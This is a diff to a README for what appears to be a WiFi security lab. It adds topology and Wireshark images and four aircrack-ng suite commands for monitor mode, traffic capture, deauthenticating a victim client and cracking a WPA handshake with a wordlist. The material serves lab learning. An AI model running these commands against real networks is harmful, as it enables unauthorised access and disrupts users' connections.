@@ -39,17 +39,33 @@ Disclaimer: <br/>
 <img src="Images/Warning.png" height="80%" width="80%" alt="Disclaimer"/>
 <br />
 <br />
+<p align="center">  
 Topology: <br/>
 <img src="Images/Topology.png" height="80%" width="80%" alt="Topology"/>
 <img src="Images/Topology2.png" height="80%" width="80%" alt="Topology"/>
+<p align="center">  
+Captured Traffic: <br/>  
+<img src="Images/Wireshark.png" height="80%" width="80%" alt="Wireshark"/>  
 <p/>
 <br />
 <br />
 
 ## Commands
 1. To put the wireless interface into monitoring mode we use the command.
+ 
+        sudo airmon-ng start wlan0
+        
+2. Next, we’ll dump the wireless traffic and write to a file with.
+ 
+        sudo airodump-ng -channel # -w handshake-capture wlan0mon  
+        
+3. Use the ESP8266 WiFi-Deauther to send deauther messages or use.
 
-                                                                        
+        sudo aireplay-ng –deauth 0 -a AP mac address -c victim’s mac address wla0mon
+        
+4. Crack captured handshake with.
+
+        sudo aircrack-ng ~/handshake-capture.cap -w /usr/share/wordlist/fasttrack.txt                                                                        
                                                                         
                                                                         
                                                                         
